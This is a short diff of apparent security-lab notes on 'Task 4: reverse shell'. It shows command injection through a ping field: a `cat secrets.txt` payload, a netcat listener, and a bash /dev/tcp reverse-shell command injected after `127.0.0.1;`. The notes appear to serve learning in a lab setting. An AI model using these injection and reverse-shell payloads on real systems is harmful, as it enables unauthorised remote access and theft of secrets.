@@ -28,4 +28,11 @@ Task 4: reverse shell:
 - `127.0.0.1; cat secrets.txt`
 
 - To open reverse shell:
-- ```127.0.0.1; nc -i>& /dev/tcp/127.0.0.1/8080 0>&1```
+- On attacker machine: 
+    - listen with port 8080, verbose
+```nc -lvp 8080```
+    - On victim:
+    - Command is `bash -i >& /dev/tcp/127.0.0.1/8080 0>&1`
+
+Therefore, this needs to be keyed into the ping:
+- ```127.0.0.1; bash -i >& /dev/tcp/127.0.0.1/8080 0>&1```
